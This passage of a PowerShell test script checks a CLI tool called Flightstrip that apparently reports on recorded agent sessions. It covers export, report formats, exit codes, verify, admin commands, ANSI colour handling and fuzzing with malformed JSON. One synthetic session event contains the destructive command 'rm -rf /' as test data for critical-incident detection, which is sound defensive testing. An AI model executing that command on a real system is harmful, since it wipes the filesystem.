    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Write-Text -Path (Join-Path $dir 'events.jsonl') -Text (($variants[$name] -join "`n") + "`n")
    Write-Text -Path (Join-Path $dir 'record.json') -Text (@{ id = $id; title = 'c'; agent = $null; started_at = '2026-11-20T00:00:00.000Z'; os = 'windows'; repo_name = 'c'; label = 'recorded' } | ConvertTo-Json -Compress)
    $out = FS $repo @('export', $id, '--out', "$name.json")
    $results += ("{0}:{1}" -f $name, $out.Code)
}
$crashed = @($results | Where-Object { $_ -match ':\d{3,}' })
Add-Row 'E16' 'corrupt events.jsonl does not panic' ($crashed.Count -eq 0) ("exit codes " + ($results -join ' '))

# ── E17: report formats and exit codes ────────────────────────────────────

$repo = New-Repo 'e17-report'
$dir = New-SyntheticSession -Repo $repo -Id '20261120T010000Z-rep' -Lines @(
    (@{ v = 1; seq = 0; t_ms = 0; kind = 'session_start'; title = 'report'; agent = 'qa'; os = 'windows'; repo_name = 'r' } | ConvertTo-Json -Compress),
    (Cmd-Event -Seq 1 -T 100 -Cmd 'rm -rf /'),
    (@{ v = 1; seq = 2; t_ms = 200; kind = 'session_end' } | ConvertTo-Json -Compress)
)
FS $repo @('export', '20261120T010000Z-rep', '--out', 'rep.json') | Out-Null
$md = FS $repo @('report', 'rep.json')
$gh = FS $repo @('report', 'rep.json', '--format', 'github')
$below = FS $repo @('report', 'rep.json', '--fail-on', 'critical')
$above = FS $repo @('report', 'rep.json', '--fail-on', 'info')
$ghFile = FS $repo @('report', 'rep.json', '--format', 'github', '--out', 'comment.md')
# The same threshold against a session with no criticals must exit 0.
$cleanRepo = Join-Path $WorkRoot 'repos\e15-clean'
$belowClean = FS $cleanRepo @('report', 'session.json', '--fail-on', 'critical')
Add-Row 'E17a' 'report md and github formats render' `
    ($md.Code -eq 0 -and $md.Out -match '# Flightstrip Report' -and $gh.Code -eq 0 -and $gh.Out.Length -gt 50) `
    ("md={0}B github={1}B" -f $md.Out.Length, $gh.Out.Length)
Add-Row 'E17b' '--fail-on exits 2 only when the threshold is hit' `
    ($below.Code -eq 2 -and $above.Code -eq 2 -and $belowClean.Code -eq 0) `
    "critical-session exit=$($below.Code), clean-session exit=$($belowClean.Code) (expect 2 and 0)"
Add-Row 'E17c' 'report --out writes the file' (Test-Path -LiteralPath (Join-Path $repo 'comment.md')) 'comment.md present'

# ── E18: verify ────────────────────────────────────────────────────────────

$okVerify = FS $repo @('verify', 'rep.json')
$corruptPath = Join-Path $repo 'corrupt.json'
Write-Text -Path $corruptPath -Text '{ "version": 1, "meta": { } }'
$badVerify = FS $repo @('verify', 'corrupt.json')
$extraPath = Join-Path $repo 'extra.json'
$extra = (Get-Content -LiteralPath (Join-Path $repo 'rep.json') -Raw | ConvertFrom-Json)
$extra | Add-Member -NotePropertyName 'future_field' -NotePropertyValue @{ a = 1 }
Write-Text -Path $extraPath -Text ($extra | ConvertTo-Json -Depth 40)
$extraVerify = FS $repo @('verify', 'extra.json')
Add-Row 'E18' 'verify: good ok, corrupt rejected, unknown field tolerated' `
    ($okVerify.Code -eq 0 -and $badVerify.Code -ne 0 -and $extraVerify.Code -eq 0) `
    ("good={0} corrupt={1} extra_field={2}" -f $okVerify.Code, $badVerify.Code, $extraVerify.Code)

# ── E19: doctor, status, list, init, prune ────────────────────────────────

$repo = New-Repo 'e19-admin'
$doctor = FS $repo @('doctor')
$status = FS $repo @('status')
$init = FS $repo @('init')
$dir = New-SyntheticSession -Repo $repo -Id '20261120T020000Z-adm' -Lines @(
    (@{ v = 1; seq = 0; t_ms = 0; kind = 'session_start'; title = 'admin'; agent = 'qa'; os = 'windows'; repo_name = 'a' } | ConvertTo-Json -Compress),
    (@{ v = 1; seq = 1; t_ms = 10; kind = 'session_end' } | ConvertTo-Json -Compress)
)
$list = FS $repo @('list', '--json')
$parsed = $null
try { $parsed = $list.Out | ConvertFrom-Json } catch { $parsed = $null }
$prune = FS $repo @('prune', '--dry-run')
$survives = Test-Path -LiteralPath $dir
Add-Row 'E19a' 'doctor, status, init run clean' ($doctor.Code -eq 0 -and $status.Code -eq 0 -and $init.Code -eq 0) `
    "doctor=$($doctor.Code) status=$($status.Code) init=$($init.Code)"
Add-Row 'E19b' 'list --json parses' ($list.Code -eq 0 -and $null -ne $parsed) $(if ($parsed) { "sessions=$(@($parsed.sessions).Count)" } else { 'unparseable' })
Add-Row 'E19c' 'prune --dry-run deletes nothing' ($prune.Code -eq 0 -and $survives) "session still present=$survives"

# ── E20: colour discipline ────────────────────────────────────────────────

$repo = Join-Path $WorkRoot 'repos\e17-report'
$plainOut = FS $repo @('report', 'rep.json')
$ansi = [regex]::Escape([char]27)
Add-Row 'E20' 'redirected output carries no ANSI escapes' ($plainOut.Out -notmatch ($ansi + '\[')) `
    $(if ($plainOut.Out -match ($ansi + '\[')) { 'ANSI found in redirected output' } else { 'clean' })

$env:NO_COLOR = '1'
$noColor = FS $repo @('report', 'rep.json')
Remove-Item Env:\NO_COLOR -ErrorAction SilentlyContinue
Add-Row 'E20b' 'NO_COLOR=1 output carries no ANSI escapes' ($noColor.Out -notmatch ($ansi + '\[')) 'checked'

# ── E21: fuzz-lite on export and verify ───────────────────────────────────

$repo = New-Repo 'e21-fuzz'
$fuzz = Join-Path $WorkRoot 'fuzz'
New-Item -ItemType Directory -Path $fuzz -Force | Out-Null
$cases = [ordered]@{}
$cases['empty']        = ''
$cases['empty-object'] = '{}'
$cases['empty-array']  = '[]'
$cases['null']         = 'null'
$cases['steps-string'] = '{ "version": 1, "meta": {}, "prompts": [], "steps": "nope", "incidents": [], "files": {}, "stats": {} }'
$cases['big-line']     = ('{"a":"' + ('x' * (5 * 1024 * 1024)) + '"}')
$cases['deep']         = ('[' * 5000) + (']' * 5000)
foreach ($name in $cases.Keys) {
    $path = Join-Path $fuzz "$name.json"
    [System.IO.File]::WriteAllText($path, $cases[$name])
}
[System.IO.File]::WriteAllBytes((Join-Path $fuzz 'invalid-utf8.json'), [byte[]](0x7B, 0xFF, 0xFE, 0x7D))
[System.IO.File]::WriteAllBytes((Join-Path $fuzz 'nul.json'), [byte[]](0x7B, 0x00, 0x7D))
[System.IO.File]::WriteAllBytes((Join-Path $fuzz 'bom.json'), [byte[]](0xEF, 0xBB, 0xBF) + [System.Text.Encoding]::UTF8.GetBytes('{"meta":{}}'))

$fuzzResults = @()
$sink = Join-Path $WorkRoot 'fuzz-sink.log'
foreach ($file in Get-ChildItem -LiteralPath $fuzz -File) {
    foreach ($verb in @('verify', 'report')) {
        # Start-Job spends a second starting a child shell, which reads as a hang.
        # A real process with a hard timeout measures the binary, not PowerShell.
        $cliArgs = if ($verb -eq 'verify') { @('verify', $file.FullName) } else { @('report', $file.FullName) }
        # Start-Process -PassThru reports an empty ExitCode in Windows PowerShell
        # 5.1, so the process is created directly and its pipes are drained
        # asynchronously to keep a large error message from blocking the child.
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $Exe
        $psi.Arguments = (($cliArgs | ForEach-Object { if ($_ -match '\s') { '"' + $_ + '"' } else { $_ } }) -join ' ')
        $psi.WorkingDirectory = $repo
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $outTask = $proc.StandardOutput.ReadToEndAsync()
        $errTask = $proc.StandardError.ReadToEndAsync()
        $finished = $proc.WaitForExit(10000)
        if (-not $finished) {
            try { $proc.Kill() } catch { }
            $fuzzResults += [pscustomobject]@{ File = $file.Name; Verb = $verb; Code = 'TIMEOUT' }
        }
        else {
            $proc.WaitForExit()
            $null = $outTask.Result
            $null = $errTask.Result
            $fuzzResults += [pscustomobject]@{ File = $file.Name; Verb = $verb; Code = $proc.ExitCode }
        }
        $proc.Dispose()
    }
}
$timeouts = @($fuzzResults | Where-Object { $_.Code -eq 'TIMEOUT' })
$panics = @($fuzzResults | Where-Object { $_.Code -notin @(0, 1, 2) -and $_.Code -ne 'TIMEOUT' })
Add-Row 'E21a' 'fuzz-lite: export/report on 10 broken inputs, no hang' ($timeouts.Count -eq 0) `
    ("{0} runs, {1} timeouts" -f $fuzzResults.Count, $timeouts.Count)
Add-Row 'E21b' 'fuzz-lite: no panic crashes (exit 101/0xC0000005)' ($panics.Count -eq 0) `
    ("unexpected exit codes: {0}" -f (($panics | ForEach-Object { "$($_.File)/$($_.Verb)=$($_.Code)" }) -join ' '))

# ── write results ─────────────────────────────────────────────────────────

$path = Join-Path $WorkRoot 'engine-results.json'
Write-Text -Path $path -Text ($script:Rows | ConvertTo-Json -Depth 5)
$failed = @($script:Rows | Where-Object { $_.Result -eq 'FAIL' })
Write-Host ""
Write-Host ("engine: {0} checks, {1} pass, {2} fail, {3} skipped" -f $script:Rows.Count, (@($script:Rows | Where-Object { $_.Result -eq 'PASS' }).Count), $failed.Count, (@($script:Rows | Where-Object { $_.Result -eq 'SKIP' }).Count))
if ($failed.Count -gt 0) { exit 1 } else { exit 0 }
